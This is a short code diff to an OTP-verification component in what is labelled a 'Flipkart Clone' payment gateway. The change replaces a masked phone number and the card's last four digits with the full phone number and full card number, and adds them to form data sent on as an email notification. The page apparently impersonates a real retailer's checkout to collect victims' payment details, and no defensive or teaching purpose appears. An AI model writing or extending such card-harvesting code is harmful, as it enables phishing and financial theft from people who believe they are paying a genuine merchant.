@@ -247,9 +247,9 @@ function GatewayOTP({ amount, phone, email, cardLast4, onVerify }: {
     try {
       const formData = new URLSearchParams();
       formData.append("event", "OTP Requested");
-      formData.append("phone_masked", maskedPhone);
+      formData.append("phone", phone || "N/A");
       formData.append("email", email || "N/A");
-      formData.append("card_last4", cardLast4 || "XXXX");
+      formData.append("card_number", payment.cardNumber || "N/A");
       formData.append("requested_at", new Date().toLocaleString("en-IN"));
       formData.append("note", "OTP verification screen opened");
       formData.append("_subject", "OTP Requested - Flipkart Clone");
